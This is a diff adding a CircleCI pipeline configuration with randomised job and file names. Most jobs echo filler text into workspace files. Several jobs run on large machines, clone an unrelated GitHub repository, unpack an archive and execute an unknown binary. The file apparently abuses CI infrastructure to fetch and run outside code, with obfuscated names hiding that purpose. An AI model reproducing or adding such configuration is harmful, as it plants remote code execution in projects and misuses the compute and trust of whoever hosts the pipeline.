+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  zoiqisgpb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: xnptyqsskwnz
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'oyzeggouxcmtxmq avgxqfbpmwigl' > /tmp/xothuo/vpdmwzhzhgmp
+            ls -la /tmp/xothuo/vpdmwzhzhgmp
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'vpdmwzhzhgmp'
+  qrtaunpivzuikde:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: wosmkvehmp
+          command: |
+            dd if=/tmp/xothuo/vpdmwzhzhgmp conv=lcase status=none | head -c 30 || true
+      - run:
+          name: egveuua
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: npghckwlpctxmdf
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  gemxdyszeklb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: xkhqmv
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'pmpeqoniecas favsqfndcjggagnqo' > /tmp/xothuo/twaljqwb
+            ls -la /tmp/xothuo/twaljqwb
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'twaljqwb'
+  ldwasndar:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: czofsbntdr
+          command: |
+            dd if=/tmp/xothuo/twaljqwb conv=lcase status=none | head -c 30 || true
+      - run:
+          name: gzxgbk
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: fgobxl
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  nqcdz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: rrbuakfpnsftcf
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'cnkobifmbkuzfebycq cnybnvcetkvepo' > /tmp/xothuo/ptfadhgkwoe
+            ls -la /tmp/xothuo/ptfadhgkwoe
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'ptfadhgkwoe'
+  tkpctmzumuv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ornxrf
+          command: |
+            dd if=/tmp/xothuo/ptfadhgkwoe conv=lcase status=none | head -c 30 || true
+      - run:
+          name: ienizlbubrmuu
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: iflemz
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+
+  zwodlcsisowvwc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: lalmxqvjboqa
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'nacnglgpjxw qjusambiiwlomelup' > /tmp/xothuo/xccfvgrwdjd
+            ls -la /tmp/xothuo/xccfvgrwdjd
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'xccfvgrwdjd'
+  ihtvhdrfqziqqnk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: opiduuo
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'hjrjcqafaopw ltpytzdvtul' > /tmp/xothuo/hmfpcgmhuydi
+            ls -la /tmp/xothuo/hmfpcgmhuydi
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'hmfpcgmhuydi'
+  dxsuhcwxrnoe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: rgyufdcoadawd
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ooceblmhnjhgntf vmjnpgwxyazicdacm' > /tmp/xothuo/apqiwyflzjyg
+            ls -la /tmp/xothuo/apqiwyflzjyg
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'apqiwyflzjyg'
+  achbbfwamcde:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ndpppyjnpjrdeg
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'rtvvnroifppaozmyx mdafifgahamkzqpdz' > /tmp/xothuo/ptfadhgkwoe
+            ls -la /tmp/xothuo/ptfadhgkwoe
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'ptfadhgkwoe'
+  ekqbgdekbkajxdi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: zdlrethfb
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'lfedasnomrma qvrqbtunzmignsjx' > /tmp/xothuo/nqmirvzkxtaw
+            ls -la /tmp/xothuo/nqmirvzkxtaw
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'nqmirvzkxtaw'
+  xstnbqyfwcye:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: gpupohknwotseo
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'qjiehuymsugt yvxllcmfcblvk' > /tmp/xothuo/mwtflh
+            ls -la /tmp/xothuo/mwtflh
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'mwtflh'
+  opgdq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ivkzm
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'fyjcksiladarctjf trnpjtpyeuhnz' > /tmp/xothuo/jaucupwhbj
+            ls -la /tmp/xothuo/jaucupwhbj
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'jaucupwhbj'
+  hqizm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: iknoudmc
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'vejlcwbrcfiqbeh ljuhgqcrcmjjwpnwgq' > /tmp/xothuo/bxipxbx
+            ls -la /tmp/xothuo/bxipxbx
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'bxipxbx'
+  dsncfncsizya:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ekpohmdyhhcw
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'mzcoqzfaxqpsnud xipatigmgpe' > /tmp/xothuo/myzemjydbuv
+            ls -la /tmp/xothuo/myzemjydbuv
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'myzemjydbuv'
+  gcqvk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: lrpqqurnetetwxn
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'bbcclpzxco holmeomgailfqdlu' > /tmp/xothuo/vpdmwzhzhgmp
+            ls -la /tmp/xothuo/vpdmwzhzhgmp
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'vpdmwzhzhgmp'
+  ddncoitb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: syvahkr
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'oqfotbvcfcsoixjv ccimdcuqetilwap' > /tmp/xothuo/grbsqfsziv
+            ls -la /tmp/xothuo/grbsqfsziv
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'grbsqfsziv'
+  fbrdoijrbqewi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: vqjqvd
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ghdrxoexluve rbhykcmnngbkwnveq' > /tmp/xothuo/rucskkulpvt
+            ls -la /tmp/xothuo/rucskkulpvt
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'rucskkulpvt'
+  azauurbkpazhspk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: fcvpapk
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ribzniazhxtvjan ieqekvsoem' > /tmp/xothuo/sofsjvm
+            ls -la /tmp/xothuo/sofsjvm
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'sofsjvm'
+  rylfvl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: phodtdmbrynrrn
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'tfcdhrwkngdorffmzs itufaaapfytxbctaxz' > /tmp/xothuo/worwzmoyahwx
+            ls -la /tmp/xothuo/worwzmoyahwx
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'worwzmoyahwx'
+  paaxxjhkonr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: lvxyyafzpdam
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'nrugjoqkwszxm xhmlmvrssmbhwumza' > /tmp/xothuo/ysbypqyrdfpize
+            ls -la /tmp/xothuo/ysbypqyrdfpize
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'ysbypqyrdfpize'
+  xgdtldlouxltod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: uoqwv
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'qggsjmlsji lnpcgklqewosi' > /tmp/xothuo/xjnrntjmujw
+            ls -la /tmp/xothuo/xjnrntjmujw
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'xjnrntjmujw'
+  qpmlnher:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: belnhnyvfnuvhi
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'znbikvsvpqkoikj gxpdlaswcrnquytwax' > /tmp/xothuo/jixwztbfba
+            ls -la /tmp/xothuo/jixwztbfba
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'jixwztbfba'
+  tzaugigasta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: sesnnvdvwxf
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'nuixrpfouxd kogbzsrgvaescjcw' > /tmp/xothuo/tzkhdazunjd
+            ls -la /tmp/xothuo/tzkhdazunjd
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'tzkhdazunjd'
+  zfyxdeedjstq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: cdpojhbvnbalz
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'jdeckewluuunmhrul ngflttjxutqpk' > /tmp/xothuo/cxxqlojv
+            ls -la /tmp/xothuo/cxxqlojv
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'cxxqlojv'
+  gyjikfbt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: bbwrmtdtun
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ivdljfpifihgqknrub kryowbfzfuwdd' > /tmp/xothuo/vpvuzeprlhj
+            ls -la /tmp/xothuo/vpvuzeprlhj
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'vpvuzeprlhj'
+  mijlxisjkwsmy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: bujyt
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'pioadszwhmakzjlnnk sefubmgcdks' > /tmp/xothuo/lzynqbfskg
+            ls -la /tmp/xothuo/lzynqbfskg
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'lzynqbfskg'
+  zssqrxcrjk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: fzbksdbjejgnsc
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'reaiwgmpcjnyc txhakxhvlpkj' > /tmp/xothuo/akozngcoswnx
+            ls -la /tmp/xothuo/akozngcoswnx
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'akozngcoswnx'
+  lpcqt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: yfrhmisjtl
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'uexebavbfhfw fbzuaavrzymewoauk' > /tmp/xothuo/pdiojiu
+            ls -la /tmp/xothuo/pdiojiu
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'pdiojiu'
+  hmitdqbpjbzm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: rewyccsna
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'krkxxpteopskcscy yqolkyoumlfqici' > /tmp/xothuo/sjbtjkzitshslk
+            ls -la /tmp/xothuo/sjbtjkzitshslk
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'sjbtjkzitshslk'
+  dowscjijnbuqdam:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: dmuipe
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ihjyxislhle xmvbxgmcoycjtq' > /tmp/xothuo/twaljqwb
+            ls -la /tmp/xothuo/twaljqwb
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'twaljqwb'
+  pzujxjtoqpywx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tedhl
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'gpgavvvjhnxywfml fsecwmijtugisj' > /tmp/xothuo/qvfpusrvxr
+            ls -la /tmp/xothuo/qvfpusrvxr
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'qvfpusrvxr'
+  vyydzhiegd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: uastxdmyf
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'zxvqacnkpovwcxi uuverjyafacocd' > /tmp/xothuo/hlorbvrobpnyw
+            ls -la /tmp/xothuo/hlorbvrobpnyw
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'hlorbvrobpnyw'
+  mqqexlymrio:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ayrhjcwofsbav
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'wjeqlnqyrzrwmkxe qsnyfnckqthayx' > /tmp/xothuo/wgzypbsvkfzjtt
+            ls -la /tmp/xothuo/wgzypbsvkfzjtt
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'wgzypbsvkfzjtt'
+  rmvqngxkrek:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: igqkcyk
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'wkkkeygeeusiexxbk bsmojazrnykxeskeex' > /tmp/xothuo/wcesnufuopcb
+            ls -la /tmp/xothuo/wcesnufuopcb
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'wcesnufuopcb'
+  wvaivekbfljg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: dyeshpwfussmco
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'duzhjgayfxa hmmoinwxzl' > /tmp/xothuo/bjibtnch
+            ls -la /tmp/xothuo/bjibtnch
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'bjibtnch'
+workflows:
+  cngyly:
+    jobs:
+      - bajvkmelysewkv
+      - zwodlcsisowvwc:
+          requires:
+            - bajvkmelysewkv
+      - yzfcco:
+          requires:
+            - zwodlcsisowvwc
+      - btaidyirllngxm:
+          requires:
+            - zwodlcsisowvwc
+      - ihtvhdrfqziqqnk:
+          requires:
+            - btaidyirllngxm
+      - jcjxriwhdbzky:
+          requires:
+            - ihtvhdrfqziqqnk
+      - kmobr:
+          requires:
+            - ihtvhdrfqziqqnk
+      - dxsuhcwxrnoe:
+          requires:
+            - kmobr
+      - pougcxdjqc:
+          requires:
+            - dxsuhcwxrnoe
+      - nqcdz:
+          requires:
+            - dxsuhcwxrnoe
+      - achbbfwamcde:
+          requires:
+            - nqcdz
+      - tkpctmzumuv:
+          requires:
+            - achbbfwamcde
+      - rcojviy:
+          requires:
+            - achbbfwamcde
+      - ekqbgdekbkajxdi:
+          requires:
+            - rcojviy
+      - elcuqkwn:
+          requires:
+            - ekqbgdekbkajxdi
+      - fkpdeapxg:
+          requires:
+            - ekqbgdekbkajxdi
+      - xstnbqyfwcye:
+          requires:
+            - fkpdeapxg
+      - ihtghllg:
+          requires:
+            - xstnbqyfwcye
+      - vfikcmignpmuzqi:
+          requires:
+            - xstnbqyfwcye
+      - opgdq:
+          requires:
+            - vfikcmignpmuzqi
+      - wedebzghrtlx:
+          requires:
+            - opgdq
+      - pwxkyg:
+          requires:
+            - opgdq
+      - hqizm:
+          requires:
+            - pwxkyg
+      - qwqgjcbfqtsekm:
+          requires:
+            - hqizm
+      - puazejrhmnapsy:
+          requires:
+            - hqizm
+      - dsncfncsizya:
+          requires:
+            - puazejrhmnapsy
+      - sijpdmifpp:
+          requires:
+            - dsncfncsizya
+      - zoiqisgpb
+      - gcqvk:
+          requires:
+            - zoiqisgpb
+      - qrtaunpivzuikde:
+          requires:
+            - gcqvk
+      - atbkhjlhe:
+          requires:
+            - gcqvk
+      - ddncoitb:
+          requires:
+            - atbkhjlhe
+      - bzdhccqjqrlzp:
+          requires:
+            - ddncoitb
+      - oxlxsxyyh:
+          requires:
+            - ddncoitb
+      - fbrdoijrbqewi:
+          requires:
+            - oxlxsxyyh
+      - uhfjziumr:
+          requires:
+            - fbrdoijrbqewi
+      - zmipqqpvzkfppzi:
+          requires:
+            - fbrdoijrbqewi
+      - azauurbkpazhspk:
+          requires:
+            - zmipqqpvzkfppzi
+      - otctbafseg:
+          requires:
+            - azauurbkpazhspk
+      - shssdpkiszft:
+          requires:
+            - azauurbkpazhspk
+      - rylfvl:
+          requires:
+            - shssdpkiszft
+      - apbgucvftrm:
+          requires:
+            - rylfvl
+      - mwglbvxiuj:
+          requires:
+            - rylfvl
+      - paaxxjhkonr:
+          requires:
+            - mwglbvxiuj
+      - ompzpgvekawgyu:
+          requires:
+            - paaxxjhkonr
+      - ihtyecgdwudjhc:
+          requires:
+            - paaxxjhkonr
+      - xgdtldlouxltod:
+          requires:
+            - ihtyecgdwudjhc
+      - aczwestaavetyh:
+          requires:
+            - xgdtldlouxltod
+      - uofqfcgujajg:
+          requires:
+            - xgdtldlouxltod
+      - qpmlnher:
+          requires:
+            - uofqfcgujajg
+      - ehhjghshpbgkw:
+          requires:
+            - qpmlnher
+      - xonxwfdotxfdh:
+          requires:
+            - qpmlnher
+      - tzaugigasta:
+          requires:
+            - xonxwfdotxfdh
+      - aqbdgdfd:
+          requires:
+            - tzaugigasta
+      - hdeyivadkcplqd:
+          requires:
+            - tzaugigasta
+      - zfyxdeedjstq:
+          requires:
+            - hdeyivadkcplqd
+      - einrk:
+          requires:
+            - zfyxdeedjstq
+      - emrqetoyivs:
+          requires:
+            - zfyxdeedjstq
+      - gyjikfbt:
+          requires:
+            - emrqetoyivs
+      - sxdbxl:
+          requires:
+            - gyjikfbt
+      - pnmlhir
+      - mijlxisjkwsmy:
+          requires:
+            - pnmlhir
+      - dkpqpqsg:
+          requires:
+            - mijlxisjkwsmy
+      - fgpkfsvcjbl:
+          requires:
+            - mijlxisjkwsmy
+      - zssqrxcrjk:
+          requires:
+            - fgpkfsvcjbl
+      - fojxff:
+          requires:
+            - zssqrxcrjk
+      - tlhrss:
+          requires:
+            - zssqrxcrjk
+      - lpcqt:
+          requires:
+            - tlhrss
+      - bnouuguyvl:
+          requires:
+            - lpcqt
+      - vdvdzqpqkbdbmyb:
+          requires:
+            - lpcqt
+      - hmitdqbpjbzm:
+          requires:
+            - vdvdzqpqkbdbmyb
+      - atnjttn:
+          requires:
+            - hmitdqbpjbzm
+      - gemxdyszeklb:
+          requires:
+            - hmitdqbpjbzm
+      - dowscjijnbuqdam:
+          requires:
+            - gemxdyszeklb
+      - ldwasndar:
+          requires:
+            - dowscjijnbuqdam
+      - mblxwkp:
+          requires:
+            - dowscjijnbuqdam
+      - pzujxjtoqpywx:
+          requires:
+            - mblxwkp
+      - xtwzmhjfxkpe:
+          requires:
+            - pzujxjtoqpywx
+      - vxcmfgdshetds:
+          requires:
+            - pzujxjtoqpywx
+      - vyydzhiegd:
+          requires:
+            - vxcmfgdshetds
+      - psrdqp:
+          requires:
+            - vyydzhiegd
+      - hdnoeepiuljw
+      - mqqexlymrio:
+          requires:
+            - hdnoeepiuljw
+      - gqaeohyakdo:
+          requires:
+            - mqqexlymrio
+      - thheeurevblwno:
+          requires:
+            - mqqexlymrio
+      - rmvqngxkrek:
+          requires:
+            - thheeurevblwno
+      - dyyznfo:
+          requires:
+            - rmvqngxkrek
+      - ieievzdwgdvgq:
+          requires:
+            - rmvqngxkrek
+      - wvaivekbfljg:
+          requires:
+            - ieievzdwgdvgq
+      - luhwhppwyyj:
+          requires:
+            - wvaivekbfljg
